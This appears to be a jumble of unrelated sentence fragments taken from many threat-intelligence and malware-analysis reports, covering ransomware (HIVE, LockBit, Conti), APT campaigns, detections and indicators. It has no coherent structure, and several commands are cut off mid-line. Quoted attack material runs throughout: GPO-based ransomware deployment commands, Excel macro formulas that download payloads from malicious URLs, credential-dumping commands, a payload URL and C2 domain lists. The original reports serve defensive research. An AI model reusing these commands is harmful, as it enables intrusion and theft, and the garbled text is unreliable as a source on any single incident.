/f Rapid7 observed the malicious actor add/change policies for the Active Directory domain to perform the following:Copy down batch scriptsExecute batch scripts (file1.bat), which:Creates administrator account on the local systemReconfigures boot configuration data (bcdedit.exe) so that the host will not load any additional drivers or services (ie: network drivers or endpoint protection)Sets various registry values to ensure the created local administrator user will automatically logon by defaultChanges the Windows Shell from Explorer to their malicious script (file2.bat)Reboots the system with the shutdown commandOn reboot, the system logs in and executes the shell (file2.bat), which:Extracts HIVE ransomware payload(s) from an encrypted archive (int.7z) using 7-Zip's console executable (7zr.exe)Executes the ransomware payload (int.exe or int64.exe)Below are some commands observed executed by the malicious actor (with necessary redactions):xcopy.exe /C/Q/H/Y/Z "\\<REDACTED>\sysvol\<REDACTED>\Policies {<REDACTED>}\Machine\Scripts\Startup\file1.bat" "C:\windows" xcopy.exe /C/Q/H/Y/Z "\\<REDACTED>\sysvol\<REDACTED>\Policies\{<REDACTED>}\Machine\Scripts\Startup\file2.bat" "C:\windows" xcopy.exe /C/Q/H/Y/Z "\\<REDACTED>\sysvol\<REDACTED>\Policies\{<REDACTED>}\Machine\Scripts\Startup\7zr.exe" "C:\windows" xcopy.exe /C/Q/H/Y/Z "\\<REDACTED>\sysvol\<REDACTED>\Policies\{<REDACTED>}\Machine\Scripts\Startup\int.7z" "C:\windows\" C:\WINDOWS\SYSTEM32\cmd.exe /c
Operation Spalax Targeted malware attacks in Colombia
This is further supported by the source and destination of these requests were cross domain: The source of the “Kerberoasting” was based in the Subsidiary environment and the Domain Controller that was attacked was in the Commerce environment. 
The stage 3 .NET binary is executed via CLR hosting Stage 2.1: Engima Driver analysis Name MD5 SHA-1 SHA-256 Driver.
On the target IP address, the malware starts scanning for phpMyAdmin, MySQL, FTP and Postgres services.
The malware then de-XORs other strings, with the hard-coded key of 0x39 000000010000b260 ldr w8, =0x1964126200000039 Most of the strings are de-XOR’d in a function aptly named de_xor_all.
Timeline Analysis and reporting completed by @Kostastsale and @IcsNick Initial Access 
"DBPath" *.* Used to search for the string "DBPath" in all files within the current directory and its subdirectories. arp –a Address resolutions for remote systems. netsh wlan show profiles Display a list of all the wireless network profiles. 
There is also an article by Lab52 describing one of the NSIS installers used in Operation Spalax, which they attribute to APT-C-36. 
Web Protocols T1090.004:
Messages are an array of three or four elements: Message type ("hello_request", "hello_response", "message", "error") Source serialized array Destination serialized array Payload (application-level data) 
All for now That wraps up Cobalt Strike, a Defender’s Guide Part 2.
Data read by resume.exe has been added to the end of the PDF file.
Reflectively loads and launches the Orchestrator. 
The code snippet below illustrates this.\n
The Prilex family is detected by all Kaspersky products as HEUR:Trojan.Win32.Prilex and HEUR:Trojan.Win64.Prilex.
Note: A SSH socket file allows a user to open multiple SSH sessions through a single, already authenticated SSH connection without additional authentication. 
It is important that the victim properly identifies the attack they've suffered, or they may pay the ransom without any chance of retrieving the lost data. 
Some tips to help prevent such C2 connection attempts: • Monitor network traffic:
Later the threat actor viewed the stolen files off network, observed by triggered canary tokens, which revealed connections from an AWS EC2 instance. Command and Control Emotet The Emotet loader pulled the main second stage payload from the following domains: 
A comparison of them is shown in Figure 11, and Figure 10 shows the decompiled code used to decrypt strings in the FatalRAT samples from this campaign, which is the same as the one described by AT&T. Figure 10.
Harden endpoints with a comprehensive Windows security solution:Manage the apps your employees can use through Windows Defender Application Control and for unmanaged solutions, enabling Smart App Control.
Regshot: Captures a "snapshot" of the registry before and after detonation of a sample to observe the changes on the host. 
At eSentire, our 24/7 SOCs are staffed with Elite Threat Hunters and Cyber Analysts who hunt, investigate, contain and respond to threats within minutes. 
Figure 5 – Dumping SAM database Stealing Credentials from Windows Credential Manager (CredMan) Windows Credential Manager stores the Web and SMB/RDP credentials of users if they choose to save them on the Windows machine, thereby preventing the authentication mechanism from asking for those passwords again on subsequent logins.
1> \\127.0.0.1\admin$\__[STRING] 2>&1 We observed enumeration of the domain trust relationships present within the environment.
Possible plugin prefixes: auth, avi, cert, crt, com, mem, sxs, msvc, dmem, mtx, net, nls, odbc, ole, pnp, ssl, win, vm, vsc, ntos, user, run, cvs, cvg, con, ssy Recording type prefixes: inf, sys, doc, mem, vmx, net, run, dat, dll. 
Get updates from Palo Alto Networks! Sign up to receive the latest news, cyber threat intelligence and research from us 
[D3-PSA] System Call Analysis
It checks that the host “api.solarwinds.com” resolves to an expected IP address If any of these checks fail, the backdoor terminates.
/TN test /SC MINUTE /MO 15 /TR "powershell \"$r=[System.
This can be done by placing hooks on critical APIs, generating a stack trace and inspecting the stack trace for wow64cpu.dll. 
Remote Services RDP is used by the group for lateral movement. 
I2P is configured and used by the dropper to download the mining tooling but also to proxy the miner’s network communications. 
Figure 5 shows one of the several code similarities observed in the function for locating the payload node in the document. 
In this second image, we employ proxychains from the attacker’s Kali Linux host to RDP into our target’s environment via the SOCKS server.
Detections for related techniques Leveraging its cross-signal capabilities, Microsoft 365 Defender alerts customers using Microsoft Defender for Office 365, Microsoft Defender for Cloud Apps, Application governance add-on, and Azure Active Directory Identity Protection to detect the techniques covered in the attack through the attack chain.
The response is a Json object that holds the new version number, URL to download the new version, command to be executed, and arguments.
Later, GoBruteforcer also tries to query the victim system using a PHP web shell.
And the LockBit 2.0 RaaS leak site has the most significant number of published victims, with over 850 in total. 
We expect to find further updates of these tools in the future to accommodate other platforms and apps. 
The following files are dropped by the malware: 
The dropper configures the backdoor with a C2 server address, RC4 encryption key, and sleep interval.
I2P Dropper Script I2P is an anonymous network layer.
This code within the MBR is responsible for loading the code which encrypts the MFT using Salsa20, displays the ransom note, and accepts the private key.
Malicious PDF used in Turkey campaign (Source: Cisco Talos) 
"Domain Admins" C:\Windows\system32\cmd.exe /C
SMBv1 Exploitation via EternalBlue NotPetya has the capability to exploit SMBv1 via the well known EternalBlue exploit.
Based on the file sizes and the file sizes of the embedded payloads in the IronPython scripts, we can make some assumptions about what the payloads likely are. 
MITRE ATT&CK techniques Note: This table was built using version 7 of the MITRE ATT&CK framework. 
[DS0024]. Detection:
[TA0001] Technique Title ID Use Phishing:
LockBit 2.0 operators also released an information-stealer dubbed StealBit, which was developed to support affiliates of the LockBit 2.0 RaaS when exfiltrating data from breached companies. 
When malware is running without debugger exception EXCEPTION_BREAKPOINT is raised, and control is transferred to the Vectored Exception Handler. 
The malware execution is done using a legitimate script, SyncAppvPublishingServer.vbs, in the system folder.
We believe that this dat file might be the loaded payload. 
Some key takeaways from the claims made in the interview were: The LockBit 2.0 threat actor claimed the group’s RaaS was unlikely to be rebranded since the team allegedly was a business that was honest with their customers – suggesting a supposed contrast between LockBit 2.0 and Avaddon, DarkSide and REvil affiliates. 
Our investigations revealed that the payload downloaded by the PowerShell script was a .NET downloader, which would subsequently retrieve an encrypted payload from the command-and-control (C&C) server. 
Cisco Secure Malware Analytics (Threat Grid) identifies malicious binaries and builds protection into all Cisco Secure products.
If these services are required, use strong passwords or Active Directory authentication. 
What is interesting about the next version is that it now contains a decoy picture when opened: Figure 7: Decoy picture The decoy appears to reference the United Front Work Department of the Central Committee of the Chinese Communist Party.
Below is the infrastructure that we used for demonstration purposes: Target Host: 192.168.88.179 Internal DNS server: 192.168.88.2 Cobalt Strike C2 domain: infosecppl.store We instructed the Beacon to execute the command systeminfo on the compromised host.
If this file is unavailable or invalid, a hardcoded default configuration is used. 
It is a universal binary supporting both x86_64 and ARM architectures. 
Blackbasta ransomware file extension detected (.basta) 
Based on the data collected by the Post-Validator, it is most likely that: The Post-Validator is deployed to ensure that the infected victim is the intended one. 
BlackCat leak site victims by country.
The implants we observed in this campaign are shipped as DLLs that ought to run in the context of exe, with the primary intent of reading a C2 address from an encrypted configuration file stored in %WINDIR%\debug\netlogon.cfg and reaching out to the server to obtain a further payload.
To learn more about how McAfee products can defend against these types of attacks, visit our blog on Building Adaptable Security Architecture Against NetWalker. 
To deobfuscate the document the tool xlmdeobfuscator was used with the following output. 
Align your security technologies against the technique. 
Of course, you can do that manually by downloading a list of indicators and searching with available tools.
The Source and Destination arrays contain the IDs of the relays through which the message has already passed and the IDs of the routers through it should be delivered to the recipient. 
Figure 11.
The malware is known to be deployed in-memory only and served as a downloader for the post-exploitation frameworks like Empire (as documented by Trellix researchers on early 2022 here).
Trendmicro noted changes to supported configurations in FOCUSFJORD, dubbed SysUpdate, in their 2020 and 2021 reports following public disclosures.
Many of these variants contain or remove functionality depending on the operator’s unique requirements at the time, which may suggest that multiple operators have access to the source code or a builder, or that a close relationship exists between the developers and operators. 
(PowerShell) extension to the exclusion list. 
Within two and a half hours of Cobalt Strike showing up in the environment and just over two days after the initial IcedID infection, the threat actors completed their objective of encrypting all systems.
It is also worth noting that the list of services to be stopped in Rorschach’s configuration is identical to that in the leaked Babuk source code.
While this could have been tampered with, observed compilation date of our oldest Windows sample. July 20, 2022:
We already copied the zip file to your client. 
[TA0008] Remote Services:
T1012Query RegistryModPipe’s GetMicInfo module queries the Registry for ORACLE MICROS RES 3700 POS version, database passwords and other configuration data. 
Kimsuky, a suspected North Korean advanced persistent threat (APT) group whose activities align with the interests of the North Korean government, is known for its global targeting of organizations and individuals.
However, the team assesses that by using Secure Shell (SSH) session socket files (see below), they could have accessed any hosts available to the users whose workstations were compromised. Plan for Potential Access to SBS 1 Conducting open-source research
If Avira or Avast are installed, the malware saves the decrypted payload to “%TEMPLATES%\marcoor.dll” and spawns it with the rundll32.exe command with the payload URL. 
C:\Windows\System32\cmd.exe /c rundll32.exe C:\ProgramData\x86.dll, StartA WMI 
Consent phishing attacks aim to trick users into granting permissions to malicious OAuth apps to gain access to user’s legitimate cloud services (mail servers, files storage, management APIs, etc.).
It is not clear how or if UNC215 uses these configuration parameters to organize and track large numbers of compromised hosts.
It does this by interacting with the target server sending 10 TLS Client
Impact About two and a half hours after initial hands on keyboard activity, the Cobalt Strike Beacon processes running across the target systems injected the Conti DLL into memory.
Timestomp [T1070.006] Modify Registry
Figure 4.
The same goes for 185.106.94[.]146, which is called by IP in the script, and which at the time resolved to jira.letmaker.top, a widely reported known 8220 Gang domain. 
When Add-Type cmdlet is executed, the C# compiler csc.exe is invoked by PowerShell to compile this class definition, which results in the creation of temporary files in %APPDATA%\Local\Temp. 
The model uses the persistence technique utilizing svchost.exe with service.dll to install a rogue service.
FedEx Phishing Campaign Abusing TrustedForm and PAAY
In early February 2023, we reported that multiple threat groups were leveraging OneNote files for malware delivery.
B PCHunter bb48f5c915ab7bbbbbf092a20169aaf3ced46b492ed69550854a55254ce10572 Backdoor.
Figure 8: Malicious PowerShell script under CustomAction Table 
Automation.
XWorm From the evidence that FortiGuard Labs accumulated during our research, we have high confidence that the 2022%20tax_documents[.]zip file we initially analyzed delivers the XWorm. 
The files n3.exe and p3.exe are identical and inject shellcode into the process explorer.exe.
For the investigators at NCC Group and Fox-IT these pieces of evidence supported the hypothesis of the adversary achieving credentials access by brute force, and more specifically by credential stuffing or password spraying. 
Connecting the Dots During our investigation, we observed some data points that connect to the same personnel.
In the generated file with a .z extension, the exfiltrated files will be compressed by the zlib algorithm to minimize the file size.
TA0010 Exfiltration T1567.002.
We have seen SYS01 stealer attacking critical government infrastructure employees, manufacturing companies, and other industries.
T1083 Lateral Movement Incident #1 There were no network restrictions on Remote Desktop Protocol (RDP), and the threat actor was able to move freely across the network; as a result, this activity was captured by multiple event types. 
(e.g., cloudfront.net). 
T1125Video CaptureFlowCloud uses OpenCV to take pictures using connected camera devices. 
We have a detailed report covering Invoke-ShareFinder.
In the course of incident response activities, CISA determined that cyber threat actors exploited the Log4Shell vulnerability in an unpatched VMware Horizon server, installed XMRig crypto mining software, moved laterally to the domain controller (DC), compromised credentials, and then implanted Ngrok reverse proxies on several hosts to maintain persistence.
[WINDOWS-CLIPBOARD] rwinsta command 5008376 [WINDOWS-CLIPBOARD] nltest command 5008377 
Cobalt Strike built-in PsExec Threat actors used the built-in Cobalt Strike jump psexec command to move laterally.
echo NGAtoDgLpvgJwPLEPFdj>\"%s\"&exit" fullword ascii$s2 = "veniamatquiest90.dll" fullword ascii$s3 = "Quaerat magni assumenda nihil architecto labore ullam autem unde temporibus mollitia illum" fullword ascii$s4 = "Quaerat tempora culpa provident" fullword ascii$s5 = "Dolores ullam tempora error distinctio
The threat actors final actions included data exfiltration using Rclone and domain wide deployment of Quantum Ransomware. 
The file “164f8295_linux.elf” (Sha256: 21162bbd796ad2bf9954265276bfebea8741596e8fe9d86070245d9b5f9db6da) is responsible for encrypting the files in the victim’s machine. 
:library /utf8output /R:'System.dll' /R:'C:\windows\Microso 
T1567.002Exfiltration Over Web Service: Exfiltration to Cloud StorageDolphin exfiltrates data to Google Drive. 
T1553.002Subvert Trust Controls: Code SigningThe attackers have used self-signed certificates to sign their malicious MSI files. 
ns.glbaitech[.]com Saturday, 20.02.2021 03:27:42 UTC F9F9D6FB3CB94B1CDF9E437141B59E16 ns.glbaitech[.]com Wednesday, 08.12.2021 07:07:28
Infection flow for the new arrival vector File name Detection name Description Letter Head.docx Decoy document with Google Drive link List of terrorist personnel IN border.rar (all entries below are part of this archive) List of terrorist personnel at the border.exe First-stage legitimate executable for DLL sideloading libcef.dll Trojan.Win32.TONEINS First-stage malware ~$Evidence information.docx Second-stage legitimate executable for DLL sideloading ~$List of terrorist personnel at the border.docx Backdoor.Win32.TONESHELL Second-stage malware Internal Letter.docx Decoy document Letter Head.docx Decoy document Table 1.
Hidden Window
This campaign highlights that reliance on antivirus software alone is insufficient for cyber defense, and the use of legitimate code to hide malware from antivirus technology is effective and growing exponentially.
Threat actors strive to cause Tax Day headaches
Helix 1.1.2927.fireeye_intel_hit_ip 1.1.2928.fireeye_intel_hit_ip 1.1.2929.fireeye_intel_hit_ip 1.1.2930.fireeye_intel_hit_ip 1.1.2947.fireeye_intel_hit_hash 1.1.2948.fireeye_intel_hit_hash 1.1.2949.fireeye_intel_hit_hash 1.1.2950.fireeye_intel_hit_hash 1.1.1404.windows_methodology_unusual_web_server_child_process 1.1.3506.windows_methodology_adfind 1.1.1650.windows_methodology_mimikatz_args 1.1.1651.antivirus_methodology_mimikatz 1.1.1652.windows_methodology_invokemimikatz_powershell_artifacts 
The decoded payload is a 64-bit executable (.exe). 
Figure 10: Benign PDF that appears while malicious activity is running in the background. 
For files greater than 5,245,000 bytes, file encryption will take place per certain calculated blocks: for example, it will encrypt first N bytes, then skip the next N bytes, then encrypt the next N bytes, and so on. Figure 12.
Infection Vector and Initial TTPs As initial attack indicators, we observed command execution through webshells on compromised Microsoft Exchange server deployments.
Threat actors use SMB to propagate malware across organizations. 
On execution, a decoy PDF is displayed to the user using xdg-open, which will open the document using the user’s preferred PDF viewer (see Figure 3).
With this realization, we were able to conquer this issue as well. 
Mitigation: Consider removing the local Administrators group from the list of groups allowed to log in through RDP
We focus on the specific targeting of expert analysts of North Korean affairs by impersonating NK News and stealing NK News credentials, and provide details on used TTPs to support collaborative hunting and detection efforts. 
Some examples are: You’ll find the rest of the domain names that we observed in the IoCs section. 
In our example, it only decrypts the files belonging to the victim who made the payment from the user key specified in the ransom note. 
SSL/TLS inspection can be used to see the contents of encrypted sessions to look for network-based indicators of malware communication protocols.
File is present on the DC and domain admin privileges are required to access this file. 
Zip Files 01f76140374da14b72a8f1e648cb8f46590419cddd56bc089e67f38cee767735 7f54dc5ddab4de19c5ad7c7b6d4398bd07d97504cdedabc398a6d6db52fe9875 bad4de1c398954b9c381d91fee52607b78e1c65bd9f38c3e82a307e236a76223 2c58bfbf8d274434e3307a76a37720d09387978e8e401780048992ea21fd222b c81175d56aa006ad140799e39c800306b439ea98b9efc4491c269eccbfeebd4e c636ed3b0ca558a92687f60f0b37c0e44ff3a6d4f15acd3cfb858fee4b0b0916 833b871f342ba7b0e852363ed123682b99588888f01567e56942889d886bb4b2 daba97a67f219443ef4b0a39e2d051179d20de6a2febb927bec4108dcac1b3a6 5698feaacd122f75d69ed1d9a561ab7210051031e821b934b3022d48a185443b f58b9794f5b973625551333f469878c1df65302733f9a3e9a214e3739cee09bf Inno-Setup Installers 3416982484faefb7b0092cc639039863e52a9aa6ba0a277f943216a398dd0f8b 804f137c4253241cdcbbe8cd59181f0621cbd26bb8a78163b8bc0461d5f3bafb 20a1c15d016a2d11659a74ae9e23e57020a4023df4c9f8c0357a38b69eddfa08 14fe2d1d1df11d887f5c53a78af6e1885928aa9256b79cd365f2c1d39397c2f4 25a5422f4a4a1d11b242730adbce06673cefee533da62a8ddef93e0074a3ba75 7d64de081057d18b1503854386a351a76caac9d71aada177373ef77b597a4f06 C&C caseiden[.]com graeslavur[.]com rapadtrai[.]com baglamanotalari[.]comoscarnaija[.]com makananwisata[.]com seleriti[.]com seemlabie[.]top craceruib[.]topmahinetain[.]top 
Using the credentials extracted from memory, the threat actors began to move laterally.
Then, the shellcode searches for two DWORD placeholders, 0xBABADEDA and 0xDEADBEAF.
However, the key didn’t decrypt on any of the embedded files in the scripts we found.
Microsoft Defender for
This pulled the next stage – the Standard IcedID Loader. 
This host only receives windows logging from Host 2. INDEX C: LIST OF SAGAN RULES DEVELOPED FROM THIS INCIDENT Rules that were developed following this incident.
The unpacked sample is approximately 540 KB (MD5: 3aaf34ffbe45e4f54b37392ad1afe9a5). 
MVISION Insights is the only proactive endpoint security solution that simultaneously prioritizes and predicts threats that matter to our customers while offering prescriptive guidance on what to do in their local environment.
Rapid7 has analyzed the behaviors of these flags, documented them in addition to discovering two new flags (-timer, -low-key) in the HIVE ransomware samples.
Delete shadow volumes and backups to harden recovery, using legitimate Windows tools such as vssadmin.exe, bcdedit.exe, wmic.exe, and wbadmin.exe Run wevutil.exe to clear the following Windows event logs: Application, Security, System and Windows Powershell. 
This blog post was authored by hasherezade NSIS (Nullsoft Scriptable Install System) is a framework dedicated to creating software installers.
NET framework utility called MSBuild.
It sets hooks on functions that load application bundles.
Signatures are leveraged to show capabilities and file characteristics.
Shell /t
A newly identified utility dubbed FJORDOHELPER can update FOCUSFJORD configurations and completely remove FOCUSFJORD from the system.
File Drop Service Utilised by the Threat Actor MITRE ATT&CK Technique CodeTechniqueT1482Discovery – Domain Trust DiscoveryT1018Discovery – Remote System DiscoveryT1069.002Discovery –
In the case of a Diffie-Hellman (DH) handshake, additional DH parameters are then exchanged, and each side separately calculates a pre-master secret.
Chinese state-sponsored cyber actors’ Credential Access TTPs with detection and mitigation recommendations Threat Actor Technique / Sub-Techniques Threat Actor Procedure(s) Detection and Mitigation Recommendations Defensive Tactics and Techniques Exploitation for
title: Tracking Traces of Malware Disguised as Hancom Office Document File and Being Distributed (RedEyes) url: https://asec.ahnlab.com/en/53377/ AhnLab Security Emergency response Center (ASEC) has confirmed the distribution of malware disguised as Hancom Office document files.
Stage 3 payload initialization 
csc.exe /noconfig
Instead, they’re downloaded from the C2 using the following pattern: https://<domain>/files/dld?t=wcup.
However, it’s also possible that the submitter collected the files from different places and just bundled them into an archive for scanning purposes.
Deobfuscate/Decode Files or Information T1140 TrickBot decodes the configuration data and modules. 
Figure 9.
The dropper uses the Add-Type cmdlet to define a new .NET class for the backdoor.
This study also suggests that Earth Preta’s cyberespionage operations have a broad reach and have the capacity to target high value targets.
These MSS-affiliated actors targeted victims in the following industries: academia, aerospace/aviation, biomedical, defense industrial base, education, government, healthcare, manufacturing, maritime, research institutes, and transportation (rail and shipping). 
Below is a more generic rule created by @bareiss_patrick which is a good example of detecting suspicious DNS traffic based on a high amount of queries for a single domain. 
We observed the following additional changes: Command to steal credentials restored in a different form; it now executes shellcode from the C&C Command to get files from portable devices completely removed Command to get files from drives is now cached/stored in the configuration until completion.
At the time of this analysis, X-Force was unable to retrieve the final payload from the servers as they have been taken down; therefore, it is uncertain whether these additional LNK files are related to ITG10 activity.
Proxy [T1090.003] Proxy: Domain Fronting [T1090.004] Communication Through Removable Media
We wrote about unpacking them in the past, i.e. here, and here.
We strongly recommend users to never enter their data on pages that promise something, such as the delivery of a supposedly suspended package.
Remote Services:
[LSASS Generic Dump Activity] (T1003.001) WINDOWS METHODOLOGY
Purpose 
Create scheduled tasks to execute the loader and updater components. 
Bodies of the SysUpdate and HyperBro backdoors We were not able in some cases to confirm the presence of a given backdoor based on the body of the Trojan itself.
ReconShark: SHA1 hash 
Zoomed-out view of GlobeImposter (hex) compared against the TZW variation. 
"cmd" /c cd /d
This may increase the likelihood that the initial entry point for wave 2 is through legitimate remote access software such as AnyDesk, especially since we know that the wave 2 wiper modifications included automatic execution upon driver installation only – potential need for urgency due to the limited time/access window.
After finishing the operation, they will clean the intrusion footprint and delete important files, including payload and network configuration files, to avoid leaking any information to analysts.
Since EarthWorm has become more common, security vendors also provide solutions to detect this powerful tool.
In this instance, the files were 2023년도 4월 29일 세미나.pdf – decoy file, and 230415.bat. 
The content of the script is: 
The compilation date is April 9, 2020.
Table 5 presents the types we have analyzed in more depth. 
StartClrRuntime:
By invoking comsvcs.dll with rundll32.exe, an adversary can create a dump of any process.
EvasionCompiled HTML FileT1218.001CHM files are used to deliver payloadsDefense EvasionMasqueradingT1036Files are masqueraded as legitimate files and scheduled tasks are named after common tasks (eg.
Despite the threat actors gaining access to the victim’s bank account information, it does not appear that the intent of the attack is financially-driven. 
They then returned 18 hours later to install further malware with high privileges. 
Create Account Black Basta threat actors created accounts with names such as temp, r, or admin. T1098.
See MITRE ATT&CK for Enterprise for all referenced tactics and techniques. 
However, these are all part of the same umbrella malware family.
The red team discovered a PowerShell script containing plaintext credentials that allowed them to escalate to admin. 
During Phase II, the team created local admin accounts and an AD account; they added the created AD account to a domain admins group. 
If not already present, consider deploying a DMZ between web-facing systems and the corporate network.
Below, we can see the results from one of our recent cases, BazarLoader and the Conti Leaks.
Implement an antivirus program and a formalized patch management process. 
During the time the actor switched between multiple hosting providers, resulting in a scattered infrastructure across several ASNs. 
By: Aliakbar Zahravi, Peter Girnus February 09, 2023Read time: ( words) Save to Folio Subscribe We recently found an active campaign that uses a fake employment pretext targeting Eastern Europeans in the cryptocurrency industry to install an information stealer.
Ransom Notes Unit 42 has observed two different versions of ransom notes sent by Ransom Cartel.
=CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"http[:]//praachichemfood[.]com/wp-content/Mwmos/","..\hvxda.ocx",0,0) =IF(JRSJG1<0,CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"https[:]//lopespublicidade[.]com/cgi-bin/e5R5oG4iEaQnxQrZDh/","..\hvxda.ocx",0,0)) =IF(JRSJG2<0,CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"https[:]//bosny[.]com/aspnet_client/rnMp0ofR/","..\hvxda.ocx",0,0)) =IF(JRSJG3<0,CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"http[:]//seasidesolutions[.]com/cgi-bin/WLoO6sEzYCJ3LTlC/","..\hvxda.ocx",0,0)) 
It is disguised as an account confirmation request.
The PHP scripts are responsible for stealing and exfiltrating information.
SB Trojan:Win32/Nibtse.
The next function is responsible for copying the shellcode from the .data section to the newly allocated memory location.
LockBit 2.0 also contains a self-spreading feature, clears logs and can print the ransom note on network printers until the paper runs out. 
Once we have obtained the this pointer address, we prepare the address of the Windows API we want to invoke along with its arguments.
title: Deja Vu All Over Again: Tax Scammers at Large url: https://www.fortinet.com/blog/threat-research/tax-scammers-at-large Affected Platforms: WindowsImpacted Users: Windows usersImpact: Compromised machines are under the control of the threat actor, potentially resulting in stolen personally identifiable information (PII), credential theft, financial loss, etc.Severity Level:
The backdoor After the extensive validation described above, the backdoor enters its main execution stage.
Credential theft is one of the primary tasks attackers need to perform post-exploitation and after gaining initial control of the target machine.
Therefore, we decided to perform a comparative analysis between the different ransomware strains linked to Eriknetwalker and some of the earliest versions of NetWalker we could find. 
The rate of discovery of new UEFI rootkits has accelerated sharply in recent years as seen by the discovery of LoJax (2018), MosaicRegressor (2020), FinSpy (2021) ESPecter (2021), MoonBounce (2022), CosmicStrand (2022), and BlackLotus (2023).
AD4513B8349209717A351E1A18AB9FD3E35165A3dr.dllWin32/ShellcodeRunner.
Encoded Royal Road payload On October 13th 2020, we noticed that a new Royal Road RTF document, shown in Figure 3, had been uploaded to VirusTotal. 
[D3-RPA] Isolate: Network Isolation Outbound Traffic Filtering [D3-OTF] Appendix B: MITRE ATT&CK Framework Figure 2: MITRE ATT&CK Enterprise tactics and techniques used by Chinese state-sponsored cyber actors (Click here for the downloadable JSON file.) 
ScarCruft profile ScarCruft, also known as APT37 or Reaper, is an espionage group that has been operating since at least 2012.
Still, the creator of this malicious document could have easily replicated the technique from the publicly available PoC linked in the blog.
Deobfuscated script pass.jsresume.exe is an advanced shellcode injector of which we had encountered only one sample as of the writing of this article.
Attempt to stop a predefined list of services, using net.exe stop. 
Upon launch, it copies the ​Dump.bin file to the ​%Templates%\war[current time][random value].bin (i.e., war166812964324445.bin).
We found 29 different varieties of the VBS and 90 other encrypted and unencrypted payloads hosted in these locations.
[TA0001] External remote services (e.g., virtual private network
"C: & cd \ & tracert <redacted_internal_ip>" cmd /C
Instead of using our toy “identity” encoding, we employ Zcash’s signed-digit encoding, which maps bit strings to a range of positive and negative integers centred around 0.\n
We have seen the attackers use three different RATs: Remcos, njRAT and AsyncRAT. Figure 1.
LockBit 2.0 management panel.
The POST request is performed as follows. 
In cases where Mint Sandstorm operators continue their pursuit of a given target, Microsoft typically observes one of two possible attack chains. 
Account Discovery: Domain Account Used commands such as net user /domain and net group /domain. T1016.
While Adget was seen used, prior to that tool being run the threat actors also deployed the tried and true AdFind, which was renamed to find.exe and called using find.bat. Another batch file named ‘AD.bat’ was dropped into the ProgramData folder on one host and used adfind to enumerate AD objects. 
All The most notable permissions above are the Mail.
According to event logs, on 02/09 at 08:51:43 UTC, EclecticIQ researchers have concluded with high confidence that the actor compromised an IOT device in the network of the Directorate General of Highways, MOTC in Taiwan
CONCLUSIONS 
This method allows the group to bypass traditional security measures and gain access to their targets undetected. 
The exploit can be employed when threat actors intercept the communication between the router and a user’s machine, and send a malicious payload that appears legitimate to poison the web cache.
On Workstation 6, the team found a .txt file containing plaintext credentials for the user.
| mv-expand AdminConsent = RawEventData.
Tendyron.exe is a legitimate executable, signed by online-banking security vendor Tendyron Corporation, and that is vulnerable to DLL search-order hijacking.
TrickBot—first identified in 2016—is a Trojan developed and operated by a sophisticated group of cybercrime actors.
Sample 4233ff7941da62b86fc2c2d92be0572c9ab534c8 has been observed in multiple ISO files masquerading as legitimate software, including: CodeTwo Exchange Manager PCFresh 2022 SDK Tools Google Chrome Google Crash Handler Steelray Project Setup BrowserRenew.iso CLFsecurity.
Threat actors often abuse, take advantage of or subvert legitimate products for malicious purposes.
Interactive debugging program. 
An endpoint with a system injected with Cobalt Strike via MSBuild is shown below.
Credential Access LSASS was accessed by an unusual process “runonce.exe” on multiple hosts, including a domain controller. 
Cyble Research & Intelligence Labs continuously monitor ransomware campaigns and will keep updating our readers with the latest information. 
rundll32.exe %Profile%\update.dll,#1 5oGygYVhos+IaqBlNdFaVJSfMiwhh4LCDn4= 
Palo Alto Networks customers receive help with the detection and prevention of Ransom Cartel ransomware through the following products and services: Cortex XDR and Next-Generation Firewalls (including cloud-delivered security services such as WildFire). 
As the malware is fileless and executed only in memory after going through several decryptions and decompression routines, it is more difficult to detect by antiviruses.
An overview of the lab setup and tools can be found in INDEX B. While continuing to run the SSH client on the emulated C2 device, the malware was detonated on the VM, we can see that the same packet following the 3-way handshake no longer contains SSH information but is detected as a Client Hello. 
T1570
Once connected to the VPN, the threat actor connected via Remote Desktop to a Domain Controller and copied the DSInternals10 PowerShell module to the system.
The emails included an attachment named ‘Credit Transfer Copy.html’, which contained a suspicious link.
As a threat intel analyst or responder, you can further drill down to gather more specific actionable intelligence on NetWalker, such as indicators of compromise and tactics/techniques aligned to the MITRE ATT&CK framework. 
T1588.005Obtain Capabilities: ExploitsTA410 had exploits for ProxyLogon and ProxyShell. 
Employing Python scripts to exploit vulnerable servers. 
Often, malware targeting Windows will be packed and delivered as a second stage.
You can also take preventative steps by requesting any of our cyber risk management services. Indicators of compromise and Ransom Cartel-associated tactics, techniques and procedures (TTPs) can be found in the Ransom Cartel ATOM. 
/c powershell ntdsutil.exe '
UAC BYPASS After creating the mutex, the ransomware modifies specific registry values to disable User Access Control (UAC), a security feature in Windows.
For additional details, SpecterOps has an article covering the DCSync technique. 
They were claiming to be a reseller of the tool. 
This attack leveraged the legitimate update functionality of the 3CX application to deliver a set of malicious payloads to 3CX users.
Introduction form evilextracom[.]com It downloads “zzyy.zip” from evilextractor[.]com.
Windows Service Creates benign-looking services for the ransomware binary. 
Word Dropper used by Hancitor On Tuesday 12 January, phishing emails with hyperlinks leading to Word documents reached users’ inboxes.
This executable uses the Windows Native API to write the contents of an embedded executable to the file system at the following location: 
Through each of the covered steps in the attack flow, specific guidance is provided to drive actions with context.
Note: For Windows 8, this is enabled by default.
Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts (for example, one account logged into multiple systems simultaneously, multiple accounts logged into the same machine simultaneously, accounts logged in at odd times or outside of business hours). 
Section 1: Defines a payload URL (hxxp://194.55.224[.]183/frsh/Remimicra.hhp).Defines the path for the 32-bit PowerShell binary on 64-bit systems ($env:windir\syswow64\WindowsPowerShell\v1.0\powershell.exe).Gets the current process command line string using ((gwmi win32_process -F ProcessId=${PID}).CommandLine) -split
In some cases, the threat actor was able to quickly return to the environment and essentially pick up where they left off, even though the organization had performed an enterprise-wide password reset, including a reset of all service accounts and the double-reset of the krbtgt account.
The below figure shows the code used by ransomware for validating and encrypting larger files. 
For the Android version of Fortnite, users are required to download the game through a helper application which is then supposed to download the game file for the device.
While reflective image loading is a known technique at this time, its use was first observed in the DoublePulsar and subsequently the SlingShot frameworks in 2017 and 2018, respectively.
Lite Loader Anomaly 
This approach allows the attacker to continuously update and eliminates reliance on fixed file names. 
